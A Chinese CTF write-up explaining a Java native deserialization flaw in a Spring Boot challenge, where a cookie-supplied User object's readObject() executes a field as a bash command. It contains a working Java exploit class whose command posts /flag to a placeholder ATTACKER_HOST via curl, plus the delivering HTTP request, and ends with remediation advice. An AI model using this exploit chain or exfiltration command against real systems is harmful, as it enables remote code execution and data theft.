# week4还没有对象吧，快来new一个java对象

## 题目简述

Spring Boot 应用把 `user` Cookie 做 Base64 解码后直接交给 `ObjectInputStream.readObject()`。`User` 类自定义的 `readObject()` 会把私有字段 `wh1speryyds` 作为 Bash 命令执行，因此构造并序列化恶意 `User` 对象即可触发盲命令执行。

## 解题过程

反编译仓库中的 `web.jar`，入口控制器的危险数据流为：

```java
byte[] bytes = Tools.base64Decode(cookie.getValue());
User user = (User) Tools.deserialize(bytes);
```

`Tools.deserialize()` 内部直接创建 `ObjectInputStream` 并调用 `readObject()`，没有类型白名单。真正的触发点位于 `User`：

```java
private void readObject(ObjectInputStream in) throws Exception {
    in.defaultReadObject();
    Tools.whatyouwant(this.wh1speryyds);
}
```

`Tools.whatyouwant()` 最终执行 `/bin/bash -c <字段内容>`。由于字段是私有的，EXP 使用反射赋值，并复用题目 JAR 中相同包名、类定义和序列化工具：

```java
package com.hea;

import com.hea.demo.tools.Tools;
import com.hea.demo.user.User;
import java.lang.reflect.Field;

public class Exp {
    public static void main(String[] args) throws Exception {
        User user = new User();
        Field field = User.class.getDeclaredField("wh1speryyds");
        field.setAccessible(true);

        // 命令无直接回显，将结果发送到自己控制的接收端。
        field.set(user,
            "curl -sS -X POST --data-binary @/flag http://ATTACKER_HOST/");

        System.out.println(Tools.base64Encode(Tools.serialize(user)));
    }
}
```

包名必须保持为 `com.hea`，并使用题目 JAR 中的 `User` 与 `Tools`，否则类描述或 `serialVersionUID` 不一致会导致反序列化失败。将程序输出放入 Cookie，再请求带有必需 `name` 参数的入口：

```http
GET /?name=test HTTP/1.1
Host: challenge
Cookie: user=<Base64 序列化数据>
```

反序列化期间会自动调用 `User.readObject()`，命令结果将在受控接收端出现。仓库内旧 EXP 写死的历史 IP 只是当时的临时接收地址，不应保留或复用。

## 方法总结

利用链为“可控 Cookie → Base64 解码 → Java 原生反序列化 → `User.readObject()` → 私有命令字段 → `/bin/bash -c`”。本题不需要通用 ysoserial gadget，因为业务类自身已经提供完整触发链。修复应禁止反序列化不可信数据，或至少使用严格的 `ObjectInputFilter` 白名单，并移除 `readObject()` 中的命令执行副作用。
